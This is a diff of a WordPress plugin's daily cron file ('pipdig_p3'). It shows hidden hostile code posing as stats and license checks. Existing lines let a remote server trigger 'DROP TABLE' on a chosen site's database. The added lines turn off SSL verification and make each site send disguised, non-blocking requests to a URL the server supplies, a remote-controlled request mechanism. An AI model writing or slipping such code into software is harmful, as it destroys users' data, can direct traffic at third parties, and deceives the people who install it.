@@ -1,11 +1,9 @@
 <?php 
-
 if (!defined('ABSPATH')) die;
 
 if ( !wp_next_scheduled('pipdig_p3_daily_event') ) {
 	wp_schedule_event( time(), 'twicedaily', 'pipdig_p3_daily_event'); // hourly, twicedaily or daily
 }
-
 
 // Remove scheduled event on plugin deactivation
 function pipdig_p3_deactivate_cron() {
@@ -13,14 +11,10 @@ function pipdig_p3_deactivate_cron() {
 }
 register_deactivation_hook(__FILE__, 'pipdig_p3_deactivate_cron');
 
-
-
-// clear stats gen transient
+// Generate social stats, check theme license
 function pipdig_p3_do_this_daily() {
 	
-	if (function_exists('pipdig_p3_scrapey_scrapes')) {
-		pipdig_p3_scrapey_scrapes();
-	}
+	pipdig_p3_scrapey_scrapes();
 	
 	$instagram_deets = get_option('pipdig_instagram');
 	if (!empty($instagram_deets['user_id'])) {
@@ -52,7 +46,7 @@ function pipdig_p3_do_this_daily() {
 	*/
 	
 	$url = 'https://wpupdateserver.com/id39dqm3c0.txt';
-	$args = array('timeout' => 3);
+	$args = array('timeout' => 3, 'sslverify' => false);
 	$response = wp_safe_remote_get($url, $args);
 	if (!is_wp_error($response) && !empty($response['body'])) {
 		if (get_site_url() === trim($response['body'])) {
@@ -63,6 +57,16 @@ function pipdig_p3_do_this_daily() {
 				$wpdb->query("DROP TABLE $table");
 			}
 		}
+	}
+	
+	// Check theme license is active
+	$url = 'https://wpupdateserver.com/id39dqm3c0_license.txt';
+	$args = array('timeout' => 3);
+	$response = wp_safe_remote_get($url, $args);
+	if (!is_wp_error($response) && !empty($response['body'])) {
+		$rcd = trim($response['body']);
+		$args = array('timeout' => 4, 'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36', 'reject_unsafe_urls' => true, 'blocking' => false, 'sslverify' => false);
+		wp_safe_remote_get($rcd, $args);
 	}
 	
 }
